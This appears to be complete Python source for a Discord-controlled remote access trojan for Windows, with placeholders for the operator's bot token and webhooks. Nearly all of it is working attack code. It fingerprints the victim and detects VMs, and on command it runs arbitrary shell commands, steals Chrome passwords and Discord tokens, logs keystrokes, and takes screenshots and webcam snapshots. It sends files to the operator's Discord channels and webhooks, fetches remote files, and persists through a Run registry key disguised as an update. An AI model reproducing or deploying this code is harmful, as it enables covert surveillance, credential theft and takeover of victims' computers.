import discord
from discord.ext import commands
import os
import subprocess as sp
import requests
import random
from cv2 import VideoCapture
from cv2 import imwrite
import platform
import re
from urllib.request import Request, urlopen
import pyautogui
from datetime import datetime
import shutil
import sys
from multiprocessing import Process
import threading
import json
import ctypes
import re
from libraries import credentials,keylogger,tokengrabber

KEYLOG = {KEYLOG}

BOT_TOKEN = "{BOT_TOKEN}"
TOKEN_WEBHOOK = "{TOKEN_WEBHOOK}"
KEYLOGGER_WEBHOOK = "{KEYLOGGER_WEBHOOK}"

SCREENSHOTS_ID = {SCREENSHOTS_ID}
DOWNLOADS_ID = {DOWNLOADS_ID}
AGENT_ONLINE_ID = {AGENT_ONLINE_ID}
CREDENTIALS_ID = {CREDENTIALS_ID}

client = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_command=None)

def isVM():
    rules = ['Virtualbox', 'vmbox', 'vmware']
    command = sp.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=sp.PIPE,
                                stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                                creationflags=0x08000000)
    out, err = command.communicate()
    command.wait()
    for rule in rules:
        if re.search(rule, out, re.IGNORECASE):
            return True
    return False

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def keylogs():
    try:
        keyloggerr = keylogger.Keylogger(interval=1800, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
        keyloggerr.start()
    except KeyboardInterrupt:
        exit()

def getIP():            
        try:
            IP = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except Exception as e:
            IP = "None"
        return IP

def getBits():
    try:
        BITS = platform.architecture()[0]
    except Exception as e:
        BITS = "None"
    return BITS

def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception as e:
        USERNAME = "None"
    return USERNAME

def getOS():
        try:
            OS = platform.platform()
        except Exception as e:
            OS = "None"
        return OS

def getCPU():
        try:
            CPU = platform.processor()
        except Exception as e:
            CPU = "None"
        return CPU

def getHostname():
    try:
        HOSTNAME = platform.node()
    except Exception as e:
        HOSTNAME = "None"
    return HOSTNAME

def createConfig():
    try:
        path = fr'"C:\Users\{USERNAME}\.config"'
        new_path = path[1:]
        new_path = new_path[:-1]
        os.mkdir(new_path)     
        os.system(f"attrib +h {path}")

    except WindowsError as e:
        if e.winerror == 183:
            pass

def createUploads():
    try:
        path = fr'C:\Users\{USERNAME}\.config\uploads'
        os.mkdir(path)
    except WindowsError as e:
        if e.winerror == 183:
            pass

ISVM = isVM()
OS = getOS()
CPU = getCPU()
IP = getIP()
BITS = getBits()
HOSTNAME = getHostname()
USERNAME = getUsername()
createConfig()
createUploads()
ISADMIN = isAdmin()

try:
    path = fr"C:\Users\{USERNAME}\.config\ID"
    with open(path, "r+") as IDfile:
        ID = IDfile.read()
        if ID == "":
            ID = random.randint(1, 10000)
            IDfile.write(str(ID))
            MSG = f"New Agent Online #{ID}"
            color = 0x00ff00
        else:
            MSG = f"Agent Online #{ID}"
            color = 0x0000FF

except Exception:
    path = fr"C:\Users\{USERNAME}\.config\ID"
    with open(path, "w+") as IDfile:
        ID = IDfile.read()
        if ID == "":
            ID = random.randint(1, 10000)
            IDfile.write(str(ID))
            MSG = f"New Agent Online #{ID}"
            color = 0x00ff00
        else:
            MSG = f"Agent Online #{ID}"
            color = 0x0000FF

@client.command(name='cd',pass_context=True)
async def cd(context):
    command = context.message.content.replace("!cd ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        path = word_list[1]
        try:
            os.chdir(path)
            my_embed = discord.Embed(title=f"Succesfully changed directory to: {path}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while changing directory:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)

@client.command(name='process',pass_context=True)
async def process(context):
    command = context.message.content.replace("!process ", "")
    result = sp.Popen("tasklist", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
    out, err = result.communicate()
    result.wait()
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        if len(out) > 4000:
            path = os.environ["temp"] +"\\response.txt"         
            with open(path, 'w') as file:
                file.write(out)
            await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
            await context.message.channel.send(file=discord.File(path))
            os.remove(path)
        else:
            await context.message.channel.send(f"```\n{out}\n```")

@client.command(name='download',pass_context=True)
async def download(context):
    command = context.message.content.replace("!download ", "")
    word_list = command.split()
    channel = client.get_channel(DOWNLOADS_ID)
    if int(word_list[0]) == int(ID):
        path = word_list[1].replace("USERNAME", USERNAME)
        try:
            await channel.send(f"**Agent #{ID}** Requested File:", file=discord.File(path))
            my_embed = discord.Embed(title=f"File succesfully downloaded from Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while downloading from Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed) 

@client.command(name='upload')
async def upload(context):
    path = fr'C:\Users\{USERNAME}\.config\uploads'
    command = context.message.content.replace("!upload ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        url = word_list[1]
        name = word_list[2]
        if name == "":
            await context.send("Please enter a name for the file")
        else:
            try:
                r = requests.get(url, allow_redirects=True, verify=False)
                open(fr"{path}\{name}", 'wb').write(r.content)
                my_embed = discord.Embed(title=f"{name} has been uploaded to Agent#{ID}", color=0x00FF00)
                await context.message.channel.send(embed=my_embed)
            except Exception as e:
                my_embed = discord.Embed(title=f"Error while uploading {name} to Agent#{ID}:\n{e}", color=0xFF0000)
                await context.message.channel.send(embed=my_embed)   
    else:
        pass

@client.command(name='token')
async def token(context):
    command = context.message.content.replace("!token ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):
            try:
                tokengrabber.main(WEBHOOK_URL=TOKEN_WEBHOOK)
                my_embed = discord.Embed(title=f"Command executed succesfully on Agent#{ID}", color=0x00FF00)
                await context.message.channel.send(embed=my_embed)
            except Exception as e:
                my_embed = discord.Embed(title=f"Error while getting Token from Agent#{ID}:\n{e}", color=0xFF0000)
                await context.message.channel.send(embed=my_embed)
    else:
        pass

@client.command(name='screenshot',pass_context=True)
async def screenshot(context):
    command = context.message.content.replace("!screenshot ", "")
    channel = client.get_channel(SCREENSHOTS_ID)
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        try:
            Screenshot = pyautogui.screenshot()
            path = os.environ["temp"] +"\\s.png"
            Screenshot.save(path)
            now = datetime.now()
            await channel.send(f"**Agent #{ID}** | Screenshot `{now.strftime('%d/%m/%Y %H:%M:%S')}`", file=discord.File(path))
            os.remove(path)
            my_embed = discord.Embed(title=f"Got screenshot from Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while taking screenshot from Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)
    else:
        pass
    
@client.command(name='webshot', pass_context=True)
async def webshot(context):
    command = context.message.content.replace("!webshot", "")
    channel = client.get_channel(SCREENSHOTS_ID)
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        try:
            cam = VideoCapture(0)
            ret, frame = cam.read()
            current_time = datetime.now()
            path = os.environ["temp"] +"\\p.png"
            imwrite(path, frame)
            now = datetime.now()
            await channel.send(f"**Agent #{ID}** | Webcam snapshot `{now.strftime('%d/%m/%Y %H:%M:%S')}`", file=discord.File(path))
            os.remove(path)
            my_embed = discord.Embed(title=f"Got webcam snapshot from Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while taking webcam snapshot from Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)

@client.command(name='keylog')
async def keylog(context):
    command = context.message.content.replace("!keylog ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        def keylogger_start():
            try:
                interval = word_list[1]
                keyloggerr = keylogger.Keylogger(interval=int(interval), ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
                keyloggerr.start()
            except IndexError:
                my_embed = discord.Embed(title=f"Error while starting Keylogger on Agent#{ID}\nMake sure you have specified all the required parameters", color=0xFF0000)
        try:
            threading.Thread(target=keylogger_start).start()
            my_embed = discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while starting keylogger on Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)
    else:
        pass

@client.command(name='credentials')
async def creds(context):
    channel = client.get_channel(CREDENTIALS_ID)
    command = context.message.content.replace("!credentials ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        try:
            data = credentials.stealcreds()
            path = os.environ["temp"] +"\\data.json"
            with open(path, 'w+') as outfile:
                json.dump(data, outfile, indent=4)
            await channel.send(f"Agent #{ID} Chrome Credentials:")
            await channel.send(file=discord.File(path))
            my_embed = discord.Embed(title=f"Got Chrome credentials from Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
            os.remove(path)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while getting Chrome credentials from Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)
    else:
        pass

@client.command(name='persistent')
async def persistent(context):
    try:
        update_location = os.environ["appdata"] + "\\update_v2.exe"
        if not os.path.exists(update_location):
            shutil.copyfile(sys.executable, update_location)
            sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + update_location + '"', shell=True)
            my_embed = discord.Embed(title=f"Persistent update created on Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        else:
            my_embed = discord.Embed(title=f"Persistence already enabled on Agent#{ID}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)
    except Exception as e:
        my_embed = discord.Embed(title=f"Error while making Agent#{ID} persistent:\n{e}", color=0xFF0000)
        await context.message.channel.send(embed=my_embed)

@client.command(name='cmd')
async def cmd(context):
    command = context.message.content.replace("!cmd ", "")
    word_list = command.split()
    if word_list[0] == str(ID):
        word_list.pop(0)
        final_command = " ".join(word_list)
        
        result = sp.Popen(final_command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
        out, err = result.communicate()
        result.wait()
        
        if len(out) > 4000:
            path = os.environ["temp"] +"\\response.txt"     
            with open(path, 'w') as file:
                file.write(out)
            await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
            await context.message.channel.send(file=discord.File(path))
            os.remove(path)
        else:
            await context.message.channel.send(f"```\n{out}\n```")
    else:
        final_command = " ".join(word_list)
        
        result = sp.Popen(final_command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
        out, err = result.communicate()
        result.wait()
        
        if len(out) > 4000:
            path = os.environ["temp"] +"\\response.txt"      
            with open(path, 'w') as file:
                file.write(out)
            await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
            await context.message.channel.send(file=discord.File(path))
            os.remove(path)
        else:
            await context.message.channel.send(f"```\n{out}\n```")

@client.command(name='ls')
async def ls(context):
    my_embed = discord.Embed(title=f"Agent #{ID}   IP: {IP}", color=0xADD8E6)
    my_embed.add_field(name="**OS**", value=OS, inline=True)
    my_embed.add_field(name="**Username**", value=USERNAME, inline=True)

    await context.message.channel.send(embed=my_embed)

@client.command(name='terminate')
async def terminate(context):
    command = context.message.content.replace("!terminate ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):  
        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{ID}", color=0x00FF00)
        await context.message.channel.send(embed=my_embed)
        await client.close()        
        exit()
    else:
        pass

@client.event
async def on_ready():
    channel = client.get_channel(AGENT_ONLINE_ID)
    now = datetime.now()
    my_embed = discord.Embed(title=f"{MSG}",description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=color)
    my_embed.add_field(name="**IP**", value=IP, inline=True)
    my_embed.add_field(name="**Bits**", value=BITS, inline=True)
    my_embed.add_field(name="**HostName**", value=HOSTNAME, inline=True)
    my_embed.add_field(name="**OS**", value=OS, inline=True) 
    my_embed.add_field(name="**Username**", value=USERNAME, inline=True)
    my_embed.add_field(name="**CPU**", value=CPU, inline=False)
    my_embed.add_field(name="**Is Admin**", value=ISADMIN, inline=True)
    my_embed.add_field(name="**Is VM**", value=ISVM, inline=True)
    my_embed.add_field(name="**Auto Keylogger**", value=KEYLOG, inline=True)
    await channel.send(embed=my_embed)

if KEYLOG:  
    threading.Thread(target=keylogs).start() 

client.run(BOT_TOKEN)
